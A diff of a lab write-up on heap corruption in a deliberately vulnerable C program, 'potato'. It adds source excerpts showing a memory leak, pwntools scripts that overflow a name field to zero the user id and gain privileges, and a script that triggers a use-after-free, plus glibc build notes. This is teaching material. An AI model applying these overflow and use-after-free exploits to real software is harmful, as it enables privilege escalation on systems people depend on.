@@ -96,14 +96,12 @@ export LD_LIBRARY_PATH=<openssl_folder>:$LD_LIBRARY_PATH
 
 ## Setup of the debugging environment
 
-Start a python virtual environment, install the `pwntools` and `libheap` packages.
+Start a python virtual environment, install the `pwntools` package.
 
 ```bash
 virtualenv venv
 . ./venv/bin/activate
 pip install pwntools
-git clone https://github.com/cloudburst/libheap
-pip3 install ./libheap/
 ```
 
 ## overwrite a user (t_user) structure to gain privileges
@@ -239,26 +237,215 @@ cmd> $ whoami
 user(name='peter' id=0 gid=10000 home='/home/peter' shell='/usr/bin/rbash')
 ```
 
-## find a memory leak to identify a heap bin or chunk (look at the session and whoami; it's enough to show the chunk or memory location in gdb) [3]
+## find a memory leak to identify a heap bin or chunk (look at the session and whoami; it's enough to show the chunk or memory location in gdb)
 
-The function `str2md5()` allocates a buffer of 90 bytes which it returns to the calling function. The calling function then has to dispose of
-that buffer after usage. In `change_password()` and in `check_password()`, however, the allocated memory is not given back. A memory leak
-is caused by an attempt to login, no matter whether it was successful or not.
+The function `str2md5()` in `login2.c` allocates a buffer of 90 bytes which it returns to the calling function. The calling function then has to dispose of
+that buffer after usage. 
 
+```c
+char *str2md5(const char *str, int length) {
+    int n;
+    MD5_CTX c;
+    unsigned char digest[16];
+    char *out = (char*)malloc(90); // md5 plus null terminator for snprintf
 
-```bash
-wget http://ftp.gnu.org/gnu/libc/glibc-6.2.tar.gz  
-tar -xf glibc-6.2.tar.gz  
-sudo apt install bison
-export LD_LIBRARY_PATH=""
-../configure --prefix=/home/kali/projects/CyberSecurity/HeapCorruption/glibc --host=i686-linux-gnu CFLAGS="-m32" CPPFLAGS="-m32" --enable-debug
-../configure --prefix=/home/kali/projects/CyberSecurity/HeapCorruption/glibc CFLAGS="-Og -g -Wno-maybe-uninitialized" CPPFLAGS="-Og -g -Wno-maybe-uninitialized" --enable-debug
+    MD5_Init(&c);
+    while (length > 0) {
+        if (length > 512) {
+            MD5_Update(&c, str, 512);
+        } else {
+            MD5_Update(&c, str, length);
+        }
+        length -= 512;
+        str += 512;
+    }
+    MD5_Final(digest, &c);
+
+    for (n = 0; n < 16; ++n) {
+        snprintf(&(out[n*2]), 16*2+1, "%02x", (unsigned int)digest[n]);
+    }
+
+    return out;
+}
 ```
 
-## gain a shell with root privileges (look at the allocator with ltrace while creating and deleting users) [4]
+In `change_password()` and in `check_password()`, however, the allocated memory is not given back using `free()`.
+
+```c
+void
+change_password()
+{
+    //char* input_password;
+    //input_password = getpass("Password: "); fflush(stdout);
+
+    char input_password[PASSWORD_LENGTH];
+    fprintf(stdout, "Password: ");
+    fgets(input_password, sizeof(input_password), stdin);
+    input_password[strcspn(input_password, "\n")] = 0x00; // terminator instead of a newline
+
+    strncpy(session.logged_in_user->password_hash, 
+            str2md5(input_password, strlen(input_password)), 
+	    32);
+    fprintf(stdout, "Password changed.\n");
+}
+```
+
+```c
+int
+check_password(t_user* user, char* password)
+{
+    return (0 == strncmp(
+                        user->password_hash, 
+		        str2md5(password, strlen(password)), 
+			32)); // md5 length
+}
+```
+
+A memory leak can be, e.g. caused by an attempt to login, no matter whether it was successful or not. Setting
+a breakpoint to `login2.c:32` will halt the process immediately before the function returns to the caller.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+import sys
+
+elf = ELF("./potato")
+
+p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
+gdb.attach(p, '''
+break main
+break login2.c:32
+continue
+''')
+
+print(p.recvuntil(b"cmd> ")) # username
+p.sendline(b"login")
+# Login as peter with the correct password, already causes a mem leak
+p.sendline(b"peter")
+p.sendline(b"12345")
+print(p.recvuntil(b"cmd> ")) # username
+
+p.interactive()
+
+```
+
+Inspecting `out` reveals that the digest of the input is returned as string:
+
+```gdb
+gef➤  p out
+$2 = 0x8123490 "827ccb0eea8a706c4c34a16891f84e7b"
+gef➤  x/33bx out
+0x8123490:      0x38    0x32    0x37    0x63    0x63    0x62    0x30    0x65
+0x8123498:      0x65    0x61    0x38    0x61    0x37    0x30    0x36    0x63
+0x81234a0:      0x34    0x63    0x33    0x34    0x61    0x31    0x36    0x38
+0x81234a8:      0x39    0x31    0x66    0x38    0x34    0x65    0x37    0x62
+0x81234b0:      0x00
+```
+
+By stepping a few times, we exit the function and see that the caller did not free the memory, nor store
+the address to it for freeing at a later point in time, hence this results in a memory leak which stores
+a digest of the password the user entered when logging in.
+
+
+## gain a shell with root privileges (look at the allocator with ltrace while creating and deleting users)
+
+
+
+
+
+## demonstrate a use after free or double free condition in the program
+
+Use the python script `./pwn_potato2_priv_user.py` to gain user privileges for user "peter".
+In order to get a "use after free condition", the user "peter" can be removed from the
+user list while being logged in at the same time. After the removal the memory chunk which
+contains peters data is still referenced from the `session->logged_in_user` global variable.
+Invoking `whoami()` after the user got deleted, causes a "use after free" condition.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+import sys
+
+elf = ELF("./potato")
+
+p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
+# set a breakpoint where user entries are removed
+# and a second one that outputs user data
+gdb.attach(p, '''
+break main
+break userlist.c:88
+break func.c:216
+continue
+''')
+
+print(p.recvuntil(b"cmd> ")) # username
+p.sendline(b"login")
+# test user
+p.sendline(b"peter")
+p.sendline(b"12345")
+print(p.recvuntil(b"cmd> ")) # username
+
+# overwrite user structure with user-chosen id: 0
+# This overwrites the bytes of the global user-id via the strncpy() call in func.c, 190
+# since strncpy adds a null terminator at session.logged_in_user->name[54]
+p.sendline(b"changename")
+payload=b"\x41" * 50 + b"\x42" * 3
+p.sendline(payload)
+
+# Repeat the same for session.logged_in_user->name[53]
+p.sendline(b"changename")
+payload=b"\x41" * 50 + b"\x42" * 2
+p.sendline(payload)
+
+# all bytes in session.logged_in_user->id are now zero, we are privileged
+# change name back to original
+p.sendline(b"changename")
+payload=b"peter" + b"\x0a"
+p.sendline(payload)
+
+#
+# delete the current user "peter"
+#
+p.sendline(b"delete")
+p.sendline(b"2")
+
+#
+# Access peter's data even if it was freed before
+#
+p.sendline(b"whoami")
+
+p.interactive()
+```
+
+After we hit the first breakpoint before the call to `free(element->user);`, we verify the memory chunk to be freed, we observe an address on the heap:
+
+```gdb
+gef➤  p element->user
+$1 = (t_user *) 0x8124150
+```
+
+after pressing `c` to continue, the next breakpoint in `whoami()` is hit. By doing
+```gdb
+gef➤  p session.logged_in_user 
+$2 = (t_user *) 0x8124150
+```
+
+we see that already freed memory is read here, i.e. this is a use-after-free scenario.
+
+
+## Experiments which eventually were not part of any solution
+
+### Compile glibc for 32 or 64 bit with debug information
+
 
 Download a glibc version, e.g. 2.41 `https://ftp.gnu.org/gnu/glibc/glibc-2.41.tar.gz`, configure it
-for 32 bit compilation with debugging info, then compile and install it, e.g. to `$HOME/projects/CyberSecurity/HeapCorruption/glibc`:
+for 32 bit compilation with debugging info, then compile and install it, e.g. to `$HOME/projects/CyberSecurity/HeapCorruption/glibc`.
+This document served as a basis:
+https://unix.stackexchange.com/questions/565593/compiling-gcc-against-a-custom-built-glibc
 
 ```bash
 cd glibc-2.41
@@ -272,17 +459,16 @@ cd build
      CXXFLAGS="-O2 -g -march=i686"
 make -sj
 make install
+```
 
+configuration for X86-64 (64 bit):
 
-for X86-64:
+```bash
 ../configure --prefix=$HOME/projects/CyberSecurity/HeapCorruption/glibc64 \
      CFLAGS="-O2 -g" \
      CXXFLAGS="-O2 -g"
-
-
 ```
-
-The target binary can now be linked against the built library using, e.g.:
+The target binary can now be linked against the built library by adapting the original makefile:
 
 ```Makefile
 CCOPTS=-ggdb3 -O0 -m32
@@ -335,8 +521,4 @@ Dynamic section at offset 0x2ee4 contains 27 entries:
 ```
 
 
-https://unix.stackexchange.com/questions/565593/compiling-gcc-against-a-custom-built-glibc
-
-
-## demonstrate a use after free or double free condition in the program [3]
 
